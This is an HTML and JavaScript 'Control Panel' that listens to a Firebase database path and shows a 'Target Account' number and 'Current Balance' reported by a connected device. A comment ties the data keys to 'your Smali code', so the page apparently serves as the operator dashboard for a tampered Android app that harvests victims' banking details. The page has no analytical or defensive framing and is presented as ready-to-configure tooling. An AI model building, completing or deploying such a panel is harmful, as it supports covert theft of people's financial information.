<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { font-family: sans-serif; background-color: #f4f7f6; margin: 0; padding: 20px; text-align: center; }
        .container { max-width: 800px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .card { border: 1px solid #ddd; padding: 15px; margin: 10px; border-radius: 8px; display: inline-block; width: 40%; }
        .value { font-size: 24px; font-weight: bold; color: #2c3e50; }
        .label { color: #7f8c8d; margin-bottom: 5px; }
        #loading { font-style: italic; color: #e67e22; }
        .status-online { color: #27ae60; font-weight: bold; }
    </style>
</head>
<body>

<div class="container">
    <h2>System Dashboard</h2>
    <div id="loading">Waiting for device data...</div>
    
    <div id="data-section" style="display: none;">
        <div class="card">
            <div class="label">Target Account</div>
            <div id="acc_val" class="value">0000000</div>
        </div>
        <div class="card">
            <div class="label">Current Balance</div>
            <div id="cash_val" class="value">0.00</div>
        </div>
        <div style="margin-top: 20px;">
            Status: <span class="status-online">Connected</span>
        </div>
    </div>
</div>

<script>
    // Paste your Firebase Config here
    const firebaseConfig = {
        apiKey: "YOUR_API_KEY",
        authDomain: "YOUR_PROJECT.firebaseapp.com",
        databaseURL: "YOUR_DATABASE_URL",
        projectId: "YOUR_PROJECT_ID",
        storageBucket: "YOUR_PROJECT.appspot.com",
        messagingSenderId: "YOUR_ID",
        appId: "YOUR_APP_ID"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Matching your App's paths: "Account" and "Cash"
    const dataRef = db.ref('Updates'); 

    dataRef.on('value', (snapshot) => {
        const loadingTrigger = document.getElementById('loading');
        const dataSection = document.getElementById('data-section');
        
        if (snapshot.exists()) {
            loadingTrigger.style.display = 'none';
            dataSection.style.display = 'block';
            
            snapshot.forEach((childSnapshot) => {
                const val = childSnapshot.val();
                
                // Directly reading the keys from your Smali code
                if(val.Account) {
                    document.getElementById('acc_val').innerText = val.Account;
                }
                if(val.Cash) {
                    document.getElementById('cash_val').innerText = val.Cash;
                }
            });
        }
    });
</script>

</body>
</html>
